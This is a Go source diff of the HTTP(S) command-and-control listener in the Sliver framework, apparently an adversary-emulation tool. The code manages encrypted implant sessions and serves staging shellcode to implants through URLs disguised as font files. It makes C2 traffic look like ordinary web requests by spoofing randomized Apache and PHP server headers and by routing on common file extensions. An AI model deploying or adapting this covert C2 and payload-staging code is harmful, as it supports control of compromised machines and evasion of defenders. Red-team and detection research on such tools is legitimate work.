@@ -27,21 +27,24 @@ import (
 	"encoding/base64"
 	"encoding/hex"
 	"encoding/pem"
+	"fmt"
 	"io/ioutil"
+	insecureRand "math/rand"
 	"net/http"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
 
-	consts "github.com/bishopfox/sliver/client/constants"
-	sliverpb "github.com/bishopfox/sliver/protobuf/sliver"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/server/certs"
 	"github.com/bishopfox/sliver/server/core"
 	"github.com/bishopfox/sliver/server/cryptography"
 	sliverHandlers "github.com/bishopfox/sliver/server/handlers"
 	"github.com/bishopfox/sliver/server/log"
 	"github.com/bishopfox/sliver/server/website"
+	"github.com/bishopfox/sliver/util/encoders"
 
 	"github.com/golang/protobuf/proto"
 	"github.com/gorilla/mux"
@@ -56,14 +59,12 @@ const (
 	defaultHTTPTimeout = time.Second * 60
 	pollTimeout        = defaultHTTPTimeout - 5
 	sessionCookieName  = "PHPSESSID"
-
-	staticWebDirName = "www"
 )
 
 // HTTPSession - Holds data related to a sliver c2 session
 type HTTPSession struct {
 	ID      string
-	Sliver  *core.Sliver
+	Session *core.Session
 	Key     cryptography.AESKey
 	Started time.Time
 	replay  map[string]bool // Sessions are mutex'd
@@ -84,27 +85,31 @@ func (s *HTTPSession) isReplayAttack(ciphertext []byte) bool {
 	return false
 }
 
-type httpSessions struct {
-	sessions *map[string]*HTTPSession
-	mutex    *sync.RWMutex
+// HTTPSessions - All currently open HTTP sessions
+type HTTPSessions struct {
+	active *map[string]*HTTPSession
+	mutex  *sync.RWMutex
 }
 
-func (s *httpSessions) Add(session *HTTPSession) {
+// Add - Add an HTTP session
+func (s *HTTPSessions) Add(session *HTTPSession) {
 	s.mutex.Lock()
 	defer s.mutex.Unlock()
-	(*s.sessions)[session.ID] = session
+	(*s.active)[session.ID] = session
 }
 
-func (s *httpSessions) Get(sessionID string) *HTTPSession {
+// Get - Get an HTTP session
+func (s *HTTPSessions) Get(sessionID string) *HTTPSession {
 	s.mutex.RLock()
 	defer s.mutex.RUnlock()
-	return (*s.sessions)[sessionID]
+	return (*s.active)[sessionID]
 }
 
-func (s *httpSessions) Remove(sessionID string) {
+// Remove - Remove an HTTP session
+func (s *HTTPSessions) Remove(sessionID string) {
 	s.mutex.Lock()
 	defer s.mutex.Unlock()
-	delete((*s.sessions), sessionID)
+	delete((*s.active), sessionID)
 }
 
 // HTTPHandler - Path mapped to a handler function
@@ -124,22 +129,42 @@ type HTTPServerConfig struct {
 
 // SliverHTTPC2 - Holds refs to all the C2 objects
 type SliverHTTPC2 struct {
-	HTTPServer      *http.Server
-	Conf            *HTTPServerConfig
-	Sessions        *httpSessions
-	SliverShellcode []byte // Sliver shellcode to serve during staging process
-	Cleanup         func()
+	HTTPServer   *http.Server
+	Conf         *HTTPServerConfig
+	HTTPSessions *HTTPSessions
+	SliverStage  []byte // Sliver shellcode to serve during staging process
+	Cleanup      func()
+
+	server    string
+	poweredBy string
+}
+
+func (s *SliverHTTPC2) getServerHeader() string {
+	if s.server == "" {
+		s.server = fmt.Sprintf("Apache/2.4.%d (Unix)", insecureRand.Intn(43))
+	}
+	return s.server
+}
+
+func (s *SliverHTTPC2) getPoweredByHeader() string {
+	if s.poweredBy == "" {
+		s.poweredBy = fmt.Sprintf("PHP/7.%d.%d",
+			insecureRand.Intn(3), insecureRand.Intn(17))
+	}
+	return s.poweredBy
 }
 
 // StartHTTPSListener - Start an HTTP(S) listener, this can be used to start both
 //						HTTP/HTTPS depending on the caller's conf
-func StartHTTPSListener(conf *HTTPServerConfig) *SliverHTTPC2 {
+// TODO: Better error handling, configurable ACME host/port
+func StartHTTPSListener(conf *HTTPServerConfig) (*SliverHTTPC2, error) {
+	StartPivotListener()
 	httpLog.Infof("Starting https listener on '%s'", conf.Addr)
 	server := &SliverHTTPC2{
 		Conf: conf,
-		Sessions: &httpSessions{
-			sessions: &map[string]*HTTPSession{},
-			mutex:    &sync.RWMutex{},
+		HTTPSessions: &HTTPSessions{
+			active: &map[string]*HTTPSession{},
+			mutex:  &sync.RWMutex{},
 		},
 	}
 	server.HTTPServer = &http.Server{
@@ -188,10 +213,10 @@ func StartHTTPSListener(conf *HTTPServerConfig) *SliverHTTPC2 {
 		_, _, err := certs.ServerGenerateRSACertificate(conf.Domain)
 		if err != nil {
 			httpLog.Errorf("Failed to generate server rsa certificate %s", err)
-			return nil
+			return nil, err
 		}
 	}
-	return server
+	return server, nil
 }
 
 func getHTTPTLSConfig(conf *HTTPServerConfig) *tls.Config {
@@ -228,21 +253,21 @@ func (s *SliverHTTPC2) router() *mux.Router {
 	// Procedural C2
 	// ===============
 	// .txt = rsakey
-	// .css = start
+	// .jsp = start
 	// .php = session
 	//  .js = poll
 	// .png = stop
-	// .ico = sliver shellcode
+	// .woff = sliver shellcode
 
-	router.HandleFunc("/{rpath:.*\\.txt$}", s.rsaKeyHandler).MatcherFunc(filterAgent).Methods(http.MethodGet)
-	router.HandleFunc("/{rpath:.*\\.css$}", s.startSessionHandler).MatcherFunc(filterAgent).Methods(http.MethodGet, http.MethodPost)
-	router.HandleFunc("/{rpath:.*\\.php$}", s.sessionHandler).MatcherFunc(filterAgent).Methods(http.MethodGet, http.MethodPost)
-	router.HandleFunc("/{rpath:.*\\.js$}", s.pollHandler).MatcherFunc(filterAgent).Methods(http.MethodGet)
-	router.HandleFunc("/{rpath:.*\\.png$}", s.stopHandler).MatcherFunc(filterAgent).Methods(http.MethodGet)
+	router.HandleFunc("/{rpath:.*\\.txt$}", s.rsaKeyHandler).MatcherFunc(filterNonce).Methods(http.MethodGet)
+	router.HandleFunc("/{rpath:.*\\.jsp$}", s.startSessionHandler).MatcherFunc(filterNonce).Methods(http.MethodGet, http.MethodPost)
+	router.HandleFunc("/{rpath:.*\\.php$}", s.sessionHandler).MatcherFunc(filterNonce).Methods(http.MethodGet, http.MethodPost)
+	router.HandleFunc("/{rpath:.*\\.js$}", s.pollHandler).MatcherFunc(filterNonce).Methods(http.MethodGet)
+	router.HandleFunc("/{rpath:.*\\.png$}", s.stopHandler).MatcherFunc(filterNonce).Methods(http.MethodGet)
 	// Can't force the user agent on the stager payload
 	// Request from msf stager payload will look like:
-	// GET /login.do/B64_ENCODED_PAYLOAD_UUID
-	router.HandleFunc("/{rpath:.*\\.do/.*$}", s.eggHandler).Methods(http.MethodGet)
+	// GET /fonts/Inter-Medium.woff/B64_ENCODED_PAYLOAD_UUID
+	router.HandleFunc("/{rpath:.*\\.woff[/]{0,1}.*$}", s.stagerHander).Methods(http.MethodGet)
 
 	// Request does not match the C2 profile so we pass it to the static content or 404 handler
 	if s.Conf.Website != "" {
@@ -255,31 +280,39 @@ func (s *SliverHTTPC2) router() *mux.Router {
 	}
 
 	router.Use(loggingMiddleware)
-	router.Use(defaultRespHeaders)
+	router.Use(s.DefaultRespHeaders)
 
 	return router
 }
 
-// This filters requests that do not have the correct "User-agent" header
-func filterAgent(req *http.Request, rm *mux.RouteMatch) bool {
-	userAgent := req.Header["User-Agent"]
-	if 0 < len(userAgent) && strings.HasPrefix(userAgent[0], "Mozillа") {
-		return true
+// This filters requests that do not have a valid nonce
+func filterNonce(req *http.Request, rm *mux.RouteMatch) bool {
+	qNonce := req.URL.Query().Get("_")
+	nonce, err := strconv.Atoi(qNonce)
+	if err != nil {
+		httpLog.Warnf("Invalid nonce '%s' ignore request", qNonce)
+		return false // NaN
 	}
-	return false
+	_, _, err = encoders.EncoderFromNonce(nonce)
+	if err != nil {
+		httpLog.Warnf("Invalid nonce (%d) ignore request", nonce)
+		return false // Not a valid encoder
+	}
+	return true
 }
 
 func loggingMiddleware(next http.Handler) http.Handler {
 	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
-		accessLog.Infof("%s - %s - %v", req.RemoteAddr, req.RequestURI, req.Header["User-Agent"])
+		accessLog.Infof("%s - %s - %v", req.RemoteAddr, req.RequestURI, req.Header.Get("User-Agent"))
 		next.ServeHTTP(resp, req)
 	})
 }
 
-func defaultRespHeaders(next http.Handler) http.Handler {
+// DefaultRespHeaders - Configures default response headers
+func (s *SliverHTTPC2) DefaultRespHeaders(next http.Handler) http.Handler {
 	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
-		resp.Header().Set("Server", "Apache/2.4.9 (Unix)")
-		resp.Header().Set("X-Powered-By", "PHP/5.1.2-1+b1")
+		resp.Header().Set("Server", s.getServerHeader())
+		resp.Header().Set("X-Powered-By", s.getPoweredByHeader())
 		resp.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate")
 
 		switch uri := req.URL.Path; {
@@ -320,11 +353,17 @@ func default404Handler(resp http.ResponseWriter, req *http.Request) {
 // [ HTTP Handlers ] ---------------------------------------------------------------
 
 func (s *SliverHTTPC2) rsaKeyHandler(resp http.ResponseWriter, req *http.Request) {
+	qNonce := req.URL.Query().Get("_")
+	nonce, err := strconv.Atoi(qNonce)
 	certPEM, _, err := certs.GetCertificate(certs.ServerCA, certs.RSAKey, s.Conf.Domain)
 	if err != nil {
 		httpLog.Infof("Failed to get server certificate for cn = '%s': %s", s.Conf.Domain, err)
 	}
-	resp.Write(certPEM)
+	_, encoder, err := encoders.EncoderFromNonce(nonce)
+	if err != nil {
+		httpLog.Infof("Failed to find encoder from nonce %d", nonce)
+	}
+	resp.Write(encoder.Encode(certPEM))
 }
 
 func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.Request) {
@@ -342,8 +381,23 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 	httpLog.Debugf("RSA Fingerprint: %s", fingerprintSHA256(publicKeyBlock))
 	privateKeyBlock, _ := pem.Decode([]byte(privateKeyPEM))
 	privateKey, _ := x509.ParsePKCS1PrivateKey(privateKeyBlock.Bytes)
-	buf, _ := ioutil.ReadAll(req.Body)
-	sessionInitData, err := cryptography.RSADecrypt(buf, privateKey)
+
+	nonce, err := strconv.Atoi(req.URL.Query().Get("_"))
+	_, encoder, err := encoders.EncoderFromNonce(nonce)
+	if err != nil {
+		httpLog.Infof("Request specified an invalid encoder (%d)", nonce)
+		resp.WriteHeader(404)
+		return
+	}
+	body, _ := ioutil.ReadAll(req.Body)
+	data, err := encoder.Decode(body)
+	if err != nil {
+		httpLog.Errorf("Failed to decode body %s", err)
+		resp.WriteHeader(404)
+		return
+	}
+
+	sessionInitData, err := cryptography.RSADecrypt(data, privateKey)
 	if err != nil {
 		httpLog.Info("RSA decryption failed")
 		resp.WriteHeader(404)
@@ -352,22 +406,22 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 	sessionInit := &sliverpb.HTTPSessionInit{}
 	proto.Unmarshal(sessionInitData, sessionInit)
 
-	session := newSession()
-	session.Key, _ = cryptography.AESKeyFromBytes(sessionInit.Key)
+	httpSession := newHTTPSession()
+	httpSession.Key, _ = cryptography.AESKeyFromBytes(sessionInit.Key)
 	checkin := time.Now()
-	session.Sliver = &core.Sliver{
-		ID:            core.GetHiveID(),
+	httpSession.Session = core.Sessions.Add(&core.Session{
+		ID:            core.NextSessionID(),
 		Transport:     "http(s)",
 		RemoteAddress: req.RemoteAddr,
 		Send:          make(chan *sliverpb.Envelope, 16),
 		RespMutex:     &sync.RWMutex{},
 		Resp:          map[uint64]chan *sliverpb.Envelope{},
 		LastCheckin:   &checkin,
-	}
-	s.Sessions.Add(session)
-	httpLog.Infof("Started new session with id %s", session.ID)
+	})
+	s.HTTPSessions.Add(httpSession)
+	httpLog.Infof("Started new session with http session id: %s", httpSession.ID)
 
-	data, err := cryptography.GCMEncrypt(session.Key, []byte(session.ID))
+	ciphertext, err := cryptography.GCMEncrypt(httpSession.Key, []byte(httpSession.ID))
 	if err != nil {
 		httpLog.Info("Failed to encrypt session identifier")
 		resp.WriteHeader(404)
@@ -376,119 +430,135 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 	http.SetCookie(resp, &http.Cookie{
 		Domain:   s.Conf.Domain,
 		Name:     sessionCookieName,
-		Value:    session.ID,
+		Value:    httpSession.ID,
 		Secure:   true,
 		HttpOnly: true,
 	})
-	resp.Write(data)
+	resp.Write(encoder.Encode(ciphertext))
 }
 
 func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request) {
 
-	session := s.getSession(req)
-	if session == nil {
-		httpLog.Infof("No session with id %#v", session.ID)
+	httpSession := s.getHTTPSession(req)
+	if httpSession == nil {
+		httpLog.Infof("No session with id %#v", httpSession.ID)
 		resp.WriteHeader(403)
 		return
 	}
 
-	data, _ := ioutil.ReadAll(req.Body)
-	if session.isReplayAttack(data) {
+	nonce, err := strconv.Atoi(req.URL.Query().Get("_"))
+	_, encoder, err := encoders.EncoderFromNonce(nonce)
+	if err != nil {
+		httpLog.Infof("Request specified an invalid encoder (%d)", nonce)
+		resp.WriteHeader(404)
+		return
+	}
+	body, _ := ioutil.ReadAll(req.Body)
+	data, err := encoder.Decode(body)
+	if err != nil {
+		httpLog.Errorf("Failed to decode body %s", err)
+		resp.WriteHeader(404)
+		return
+	}
+
+	if httpSession.isReplayAttack(data) {
 		httpLog.Warn("Replay attack detected")
 		resp.WriteHeader(404)
 		return
 	}
-	body, err := cryptography.GCMDecrypt(session.Key, data)
+	plaintext, err := cryptography.GCMDecrypt(httpSession.Key, data)
 	if err != nil {
 		httpLog.Warnf("GCM decryption failed %v", err)
 		resp.WriteHeader(404)
 		return
 	}
 	envelope := &sliverpb.Envelope{}
-	proto.Unmarshal(body, envelope)
+	proto.Unmarshal(plaintext, envelope)
 
-	handlers := sliverHandlers.GetSliverHandlers()
+	handlers := sliverHandlers.GetSessionHandlers()
 	if envelope.ID != 0 {
-		session.Sliver.RespMutex.RLock()
-		defer session.Sliver.RespMutex.RUnlock()
-		if resp, ok := session.Sliver.Resp[envelope.ID]; ok {
+		httpSession.Session.RespMutex.RLock()
+		defer httpSession.Session.RespMutex.RUnlock()
+		if resp, ok := httpSession.Session.Resp[envelope.ID]; ok {
 			resp <- envelope
 		}
 	} else if handler, ok := handlers[envelope.Type]; ok {
-		handler.(func(*core.Sliver, []byte))(session.Sliver, envelope.Data)
+		handler.(func(*core.Session, []byte))(httpSession.Session, envelope.Data)
 	}
 	resp.WriteHeader(200)
 	// TODO: Return random data?
 }
 
 func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) {
-	session := s.getSession(req)
-	if session == nil {
-		httpLog.Infof("No session with id %#v", session.ID)
+	httpSession := s.getHTTPSession(req)
+	if httpSession == nil {
+		httpLog.Infof("No session with id %#v", httpSession.ID)
 		resp.WriteHeader(403)
 		return
 	}
 
+	// We already know we have a valid nonce because of the middleware filter
+	nonce, _ := strconv.Atoi(req.URL.Query().Get("_"))
+	_, encoder, _ := encoders.EncoderFromNonce(nonce)
 	select {
-	case envelope := <-session.Sliver.Send:
+	case envelope := <-httpSession.Session.Send:
 		resp.WriteHeader(200)
 		envelopeData, _ := proto.Marshal(envelope)
-		data, _ := cryptography.GCMEncrypt(session.Key, envelopeData)
-		resp.Write(data)
+		data, _ := cryptography.GCMEncrypt(httpSession.Key, envelopeData)
+		resp.Write(encoder.Encode(data))
 	case <-time.After(pollTimeout):
-		httpLog.Info("Poll time out")
+		httpLog.Debug("Poll time out")
 		resp.WriteHeader(201)
 		resp.Write([]byte{})
 	}
 }
 
 func (s *SliverHTTPC2) stopHandler(resp http.ResponseWriter, req *http.Request) {
-	session := s.getSession(req)
-	if session == nil {
-		httpLog.Infof("No session with id %#v", session.ID)
+	httpSession := s.getHTTPSession(req)
+	if httpSession == nil {
+		httpLog.Infof("No session with id %#v", httpSession.ID)
 		resp.WriteHeader(403)
 		return
 	}
 
 	nonce := []byte(req.URL.Query().Get("nonce"))
-	if session.isReplayAttack(nonce) {
+	if httpSession.isReplayAttack(nonce) {
 		httpLog.Warn("Replay attack detected")
 		resp.WriteHeader(404)
 		return
 	}
-	_, err := cryptography.GCMDecrypt(session.Key, nonce)
+	_, err := cryptography.GCMDecrypt(httpSession.Key, nonce)
 	if err != nil {
 		httpLog.Warnf("GCM decryption failed %v", err)
 		resp.WriteHeader(404)
 		return
 	}
 
-	core.Hive.RemoveSliver(session.Sliver)
-	core.EventBroker.Publish(core.Event{
-		EventType: consts.DisconnectedEvent,
-		Sliver:    session.Sliver,
-	})
-	s.Sessions.Remove(session.ID)
-
+	core.Sessions.Remove(httpSession.Session.ID)
+	s.HTTPSessions.Remove(httpSession.ID)
 	resp.WriteHeader(200)
 }
 
-// eggHandler - Serves the sliver shellcode to the egg requesting it
-func (s *SliverHTTPC2) eggHandler(resp http.ResponseWriter, req *http.Request) {
-	httpLog.Infof("Received egg request from %s", req.RemoteAddr)
-	resp.Write(s.SliverShellcode)
-	httpLog.Infof("Serving sliver shellcode (size %d) to %s", len(s.SliverShellcode), req.RemoteAddr)
-	resp.WriteHeader(200)
+// stagerHander - Serves the sliver shellcode to the stager requesting it
+func (s *SliverHTTPC2) stagerHander(resp http.ResponseWriter, req *http.Request) {
+	if len(s.SliverStage) != 0 {
+		httpLog.Infof("Received staging request from %s", req.RemoteAddr)
+		resp.Write(s.SliverStage)
+		httpLog.Infof("Serving sliver shellcode (size %d) to %s", len(s.SliverStage), req.RemoteAddr)
+		resp.WriteHeader(200)
+	} else {
+		resp.WriteHeader(404)
+	}
 }
 
-func (s *SliverHTTPC2) getSession(req *http.Request) *HTTPSession {
+func (s *SliverHTTPC2) getHTTPSession(req *http.Request) *HTTPSession {
 	for _, cookie := range req.Cookies() {
 		if cookie.Name == sessionCookieName {
-			session := s.Sessions.Get(cookie.Value)
-			if session != nil {
+			httpSession := s.HTTPSessions.Get(cookie.Value)
+			if httpSession != nil {
 				checkin := time.Now()
-				session.Sliver.LastCheckin = &checkin
-				return session
+				httpSession.Session.LastCheckin = &checkin
+				return httpSession
 			}
 			return nil
 		}
@@ -496,7 +566,7 @@ func (s *SliverHTTPC2) getSession(req *http.Request) *HTTPSession {
 	return nil // No valid cookie names
 }
 
-func newSession() *HTTPSession {
+func newHTTPSession() *HTTPSession {
 	return &HTTPSession{
 		ID:      newHTTPSessionID(),
 		Started: time.Now(),
